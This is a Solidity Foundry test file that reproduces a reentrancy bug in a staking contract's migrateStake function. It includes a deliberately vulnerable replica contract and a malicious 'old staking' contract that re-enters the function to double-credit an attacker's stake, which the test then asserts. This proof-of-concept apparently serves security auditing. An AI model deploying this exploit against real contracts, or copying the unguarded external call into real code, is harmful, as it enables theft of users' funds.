// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract StaxLPStaking {
    uint256 private _totalSupply;
    mapping(address => uint256) private balances;

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    // Vulnerable: calls an arbitrary old staking contract BEFORE updating state
    function migrateStake(address oldStaking, uint256 amount) external {
        // call into the old staking contract which could be malicious
        StaxLPStaking(oldStaking).migrateWithdraw(msg.sender, amount);
        _applyStake(msg.sender, amount);
    }

    // minimal internal stake application
    function _applyStake(address _for, uint256 _amount) internal {
        _totalSupply += _amount;
        balances[_for] += _amount;
    }
}

// Dummy old staking that does nothing on migrateWithdraw
contract DummyOld {
    function migrateWithdraw(address, uint256) external {
        // no-op
    }
}

// Malicious old staking: when newStaking calls migrateWithdraw, reenter migrateStake
contract MaliciousOld {
    address public dummyOld;

    constructor(address _dummy) {
        dummyOld = _dummy;
    }

    // This is called by the new staking contract during migration.
    // It re-enters the new staking contract, causing _applyStake to be called twice.
    function migrateWithdraw(address /*staker*/, uint256 amount) external {
        // msg.sender is the NEW staking contract
        StaxLPStaking(msg.sender).migrateStake(dummyOld, amount);
    }
}

contract StaxLPStakingTest is Test {
    StaxLPStaking target;
    MaliciousOld mal;
    DummyOld dummy;
    address attacker;

    function setUp() public {
        target = new StaxLPStaking();
        dummy = new DummyOld();
        mal = new MaliciousOld(address(dummy));
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_migrateStake() public {
        // Attacker triggers migrateStake pointing to the malicious old staking contract
        vm.prank(attacker);
        target.migrateStake(address(mal), 100);

        // Because of reentrancy via the malicious old contract, the stake was applied twice
        assertEq(target.balanceOf(attacker), 200);
    }
}

